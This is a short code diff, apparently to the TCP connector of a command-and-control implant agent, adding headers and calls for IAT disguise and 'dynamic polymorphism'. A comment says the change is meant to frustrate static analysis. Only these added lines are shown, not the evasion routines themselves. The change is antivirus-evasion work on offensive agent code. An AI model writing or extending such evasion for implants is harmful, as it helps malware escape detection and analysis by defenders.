@@ -5,6 +5,8 @@
 #include "Crypt.h"
 #include "utils.h"
 #include "Agent.h"
+#include "IatDisguise.h"
+#include "DynamicPolymorphism.h"
 
 extern Agent* g_Agent;
 
@@ -50,6 +52,10 @@ Connector* CreateConnectorTCP()
 	data->functions->send		     = ApiWin->send;
 	data->functions->recv		     = ApiWin->recv;
 	data->functions->shutdown		 = ApiWin->shutdown;
+
+	// Disguise IAT entries to frustrate static analysis
+	IatDisguise_Init();
+	AX_SPOOF_CONNECTOR_JUNK();
 
     conn->SetProfile = ConnectorTCP_SetProfile;
     conn->WaitForConnection = ConnectorTCP_WaitForConnection;
